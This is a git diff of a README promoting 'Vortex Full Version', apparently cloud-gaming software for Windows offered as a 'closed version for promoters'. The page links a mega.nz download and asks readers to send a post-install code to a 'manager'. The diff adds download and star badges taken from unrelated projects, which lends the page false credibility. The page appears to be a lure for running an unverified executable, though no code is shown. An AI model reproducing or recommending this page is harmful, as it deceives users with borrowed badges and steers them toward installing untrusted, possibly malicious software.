@@ -1,6 +1,11 @@
 # **Vortex Full Version**
+
+![alt-text](https://img.shields.io/npm/dy/silentlad).
+![alt-text](https://img.shields.io/github/stars/silent-lad/VueSolitaire.svg?style=flat).
+![alt-text](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat).
 -------------
 ![alt-text](https://github.com/Vortex-Cloud-Gaming/Update/blob/master/Vortex.png).
+
 # Closed version for promoters.
 ### 💻 Only for Windows 7/8/8.1/10
 #### Windows Tech Specs
@@ -17,7 +22,7 @@
 
 ## Example of code issuance after installation.
 ![alt-text](https://i.ibb.co/HPQFFhF/Example.jpg" ).
-## Send this code our manager 💁‍♀️.
+## Send this code our manager 💁‍.
 #
 
 ## [⚡Vortex Version 4.2] (https://mega.nz/file/pC5THIzR#yWxIp_gZ37nh21VxsK0Y95fuXkG884EYeICj9ggEM04):
